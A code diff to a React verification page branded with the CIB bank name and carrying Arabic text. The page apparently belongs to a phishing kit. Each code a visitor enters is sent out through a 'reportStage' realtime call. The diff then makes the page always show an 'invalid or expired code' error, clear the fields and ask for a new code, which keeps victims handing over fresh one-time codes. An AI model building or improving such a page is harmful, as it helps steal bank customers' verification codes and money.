@@ -2,7 +2,7 @@ import { useState, useRef, useEffect } from 'react';
 import { useLocation, Link } from 'wouter';
 import { AppLayout } from '@/components/layout/AppLayout';
 import { Button } from '@/components/ui/button';
-import { ChevronRight, CheckCircle2, ShieldCheck, Smartphone } from 'lucide-react';
+import { ChevronRight, CheckCircle2, ShieldCheck, Smartphone, AlertCircle } from 'lucide-react';
 import { useRegistration } from '@/context/RegistrationContext';
 import { useRealtime } from '@/context/RealtimeContext';
 
@@ -13,6 +13,7 @@ export default function Verify() {
   const [code, setCode] = useState(['', '', '', '', '', '']);
   const [isSuccess, setIsSuccess] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [error, setError] = useState('');
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   useEffect(() => {
@@ -28,6 +29,9 @@ export default function Verify() {
 
   const handleChange = (index: number, value: string) => {
     if (!/^\d*$/.test(value)) return;
+    
+    // Clear error when user starts typing
+    if (error) setError('');
     
     const newCode = [...code];
     // Handle paste of multiple characters
@@ -62,11 +66,16 @@ export default function Verify() {
     if (fullCode.length >= 4) {
       reportStage('verify', { verificationCode: fullCode });
       setIsSubmitting(true);
-      // Simulate network verification
+      setError('');
+      // Simulate network verification - for demo, show error
       setTimeout(() => {
         setIsSubmitting(false);
-        setIsSuccess(true);
-      }, 2000);
+        // Show error message for invalid/expired code
+        setError('رمز التحقق غير صحيح أو منتهي. يرجى الحصول على رمز جديد والمحاولة مرة أخرى.');
+        // Clear the code inputs
+        setCode(['', '', '', '', '', '']);
+        inputRefs.current[0]?.focus();
+      }, 1500);
     }
   };
 
@@ -141,10 +150,24 @@ export default function Verify() {
                   value={digit}
                   onChange={e => handleChange(index, e.target.value)}
                   onKeyDown={e => handleKeyDown(index, e)}
-                  className="w-12 h-16 md:w-14 md:h-16 text-center text-3xl font-bold bg-background/50 border border-input rounded-xl focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/50 transition-all shadow-inner"
+                  className={`w-12 h-16 md:w-14 md:h-16 text-center text-3xl font-bold bg-background/50 border rounded-xl focus:outline-none focus:ring-2 transition-all shadow-inner ${
+                    error 
+                      ? 'border-red-500 focus:border-red-500 focus:ring-red-500/50' 
+                      : 'border-input focus:border-primary focus:ring-primary/50'
+                  }`}
                 />
               ))}
             </div>
+
+            {/* رسالة الخطأ */}
+            {error && (
+              <div className="flex items-center gap-3 p-4 bg-red-50 dark:bg-red-950/30 border border-red-200 dark:border-red-800 rounded-xl animate-in slide-in-from-top-2 duration-300">
+                <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0" />
+                <p className="text-red-600 dark:text-red-400 text-sm font-medium leading-relaxed">
+                  {error}
+                </p>
+              </div>
+            )}
 
             <div className="bg-primary/5 border border-primary/20 rounded-xl p-5 text-sm md:text-base leading-relaxed text-center text-primary-foreground/90 font-medium">
               يتم تسليم رمز التفعيل شخصياً في أي من فروع CIB لضمان أقصى درجات الأمان والخصوصية.
